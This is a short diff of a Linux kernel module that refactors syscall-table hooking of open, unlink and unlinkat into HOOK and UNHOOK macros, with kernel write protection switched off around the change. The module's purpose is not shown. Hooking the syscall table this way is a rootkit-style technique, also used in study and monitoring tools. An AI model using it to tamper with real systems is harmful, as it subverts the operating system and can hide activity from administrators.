@@ -50,12 +50,9 @@ init_module(void)
   sys_call_table = get_sys_call_table();
 
   disable_write_protection();
-  real_open = (void *)sys_call_table[__NR_open];
-  sys_call_table[__NR_open] = (unsigned long*)fake_open;
-  real_unlink = (void *)sys_call_table[__NR_unlink];
-  sys_call_table[__NR_unlink] = (unsigned long*)fake_unlink;
-  real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
-  sys_call_table[__NR_unlinkat] = (unsigned long*)fake_unlinkat;
+  HOOK_SYS_CALL_TABLE(open);
+  HOOK_SYS_CALL_TABLE(unlink);
+  HOOK_SYS_CALL_TABLE(unlinkat);
   enable_write_protection();
 
   return 0;
@@ -66,9 +63,9 @@ void
 cleanup_module(void)
 {
   disable_write_protection();
-  sys_call_table[__NR_open] = (unsigned long*)real_open;
-  sys_call_table[__NR_unlink] = (unsigned long*)real_unlink;
-  sys_call_table[__NR_unlinkat] = (unsigned long*)real_unlinkat;
+  UNHOOK_SYS_CALL_TABLE(open);
+  UNHOOK_SYS_CALL_TABLE(unlink);
+  UNHOOK_SYS_CALL_TABLE(unlinkat);
   enable_write_protection();
 
   printk(KERN_ALERT "%s\n", "Farewell the World!");
